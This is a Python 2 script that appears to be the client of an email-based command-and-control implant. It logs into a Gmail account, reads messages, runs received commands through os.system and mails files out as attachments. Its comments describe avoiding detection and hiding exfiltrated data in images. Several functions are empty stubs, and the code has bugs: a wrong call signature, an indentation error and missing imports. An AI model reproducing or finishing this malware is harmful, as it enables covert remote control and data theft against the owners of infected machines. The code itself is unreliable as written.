#! /usr/bin/python
import imaplib
import smtplib
import threading
import email
import os


IMAP_SERVER = "imap.gmail.com"
IMAP_PORT   = 993

config = open("./config", "r+")
waitList = [] # stores commands to be executed, must stay under 2 threads as not to raise the alarms
OSType = "" # received in the config, must be specified within the payload creation


def fromConfig():
	raw_config = config.readlines()
	global serverAddr
	global clientAddr
	global clientPass
	global modulesAvailable


	serverAddr = raw_config[0].strip()
	clientAddr = raw_config[1].strip()
	clientPass = raw_config[2].strip()
	modulesAvailable = raw_config[3].strip()
	return
def readMail(user,upass):
	server = imaplib.IMAP4_SSL(IMAP_SERVER,IMAP_PORT)
	
	server.login(user,upass)
	server.select("inbox")
	
	type, data = server.search(None, 'ALL')
	mail_ids = data[0]
	
	id_list = mail_ids.split()
	
	first_id = int(id_list[0])
	
	latest_id = int(id_list[-1])
	print latest_id


	for i in range(latest_id, first_id, -1):
		typ, data = server.fetch(i, '(RFC822)')
		#print data
		for response_part in data:
			if isinstance(response_part, tuple):
				msg = email.message_from_string(response_part[1])
				#print msg
				email_subject = msg['subject']
				email_from = msg['from']
				print email_subject
				print email_from
				
				if msg.is_multipart():
					for part in msg.walk():
						print part.get_content_type()
def executeModule(moduleNum): #runs the specified module and generates a report back to the server
	os.system(moduleNum)
	pass
def sendReport(moduleNum, status, exifData): #sends an update to the server with the module number, if it succeeded or not, and any exfiltrated data hidden in an image
	pass
def newKey(): #when the newKey command is sent from the server along with the generated key, this integrates it into communication and sends back the old key in the "OK"
	pass
def encrypt(): #same as the server
	pass
def decrypt(): #see above
	pass
def updateConfig(newConfig): #updates the config to replace an old email, or update the modules list
	try:
		config.truncate(0)
		for line in newConfig:
		config.write(line)
		return 1
	except Exception, e:
		return e
	pass

def mailSender(reUser, seUser,sePass,subject,text,files): #the actual sending of the email is handled here, fragmenting and obfuscation done elsewhere

	email_text = """\
From: %s
To: %s
Subject: %s

%s
""" % (seUser, reUser, subject, text)

	msg = MIMEMultipart()
	msg['From'] = seUser
	msg['To'] = reUser
	msg['Subject'] = subject

	msg.attach(MIMEText(text))

	for f in files or []:
		with open(f, "rb") as fil:
			part = MIMEApplication(fil.read(),Name=basename(f)
			)
	part['Content-Disposition'] = 'attachment; filename="%s"' % basename(f)
	msg.attach(part)
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.ehlo()
	server.starttls()

	server.login(seUser, sePass)
	server.sendmail(seUser, reUser, msg.as_string())


def main():
	fromConfig(config)
	readMail(clientAddr, clientPass)
	pass
main()